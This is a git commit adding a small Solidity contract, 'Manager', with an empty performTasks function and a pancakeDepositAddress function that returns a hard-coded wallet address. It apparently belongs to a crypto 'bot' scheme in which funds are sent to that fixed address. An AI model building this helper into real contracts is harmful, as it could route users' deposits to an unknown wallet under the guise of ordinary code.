4cab8b8575c1f911f65c2714ff9f0342113b28db
Project Jutawan <84556389+projectjutawan@users.noreply.github.com>
2021-05-21 23:57:11 +0800

    Initial commit

---
+++ codemanager.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.0;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0xf0C0B3094cfC45B8B0E71e8434583EEA529E96e5;
+	}
+}
